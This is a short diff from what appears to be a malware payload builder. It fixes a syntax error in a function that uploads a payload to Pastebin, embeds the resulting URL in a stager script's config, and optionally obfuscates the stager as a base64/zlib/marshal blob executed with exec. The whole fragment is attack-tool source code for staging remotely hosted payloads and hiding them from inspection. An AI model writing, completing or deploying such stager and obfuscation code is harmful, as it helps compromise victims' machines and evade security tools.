@@ -50,7 +50,7 @@ def py(options, payload='modules/payload.py', stager='resources/stager.py', **kw
         print(colorama.Fore.GREEN + colorama.Style.BRIGHT + "[+] " + colorama.Fore.RESET + "Upload to Pastebin complete")
         print(color + colorama.Style.DIM + "    ({:,} bytes uploaded to: {}".format(len(payload), url).ljust(80 - len("[+] ")))
         kwargs.update({'payload': url})
-        stager = '\n'.join(['#!/usr/bin/python',"from __future__ import print_function", stager, "if __name__=='__main__':", "\t_=main(config={})".format(json.dumps(kwargs)])
+        stager = '\n'.join(['#!/usr/bin/python',"from __future__ import print_function", stager, "if __name__=='__main__':", "\t_=main(config={})".format(json.dumps(kwargs))])
         if options.obfuscate:
             code = "import zlib,base64,marshal;exec(marshal.loads(zlib.decompress(base64.b64decode({}))))".format(repr(base64.b64encode(zlib.compress(marshal.dumps(compile(stager, '', 'exec')), 9))))
             diff =  round(float(100.0 * float(1.0 - float(len(code))/float(len(stager)))))
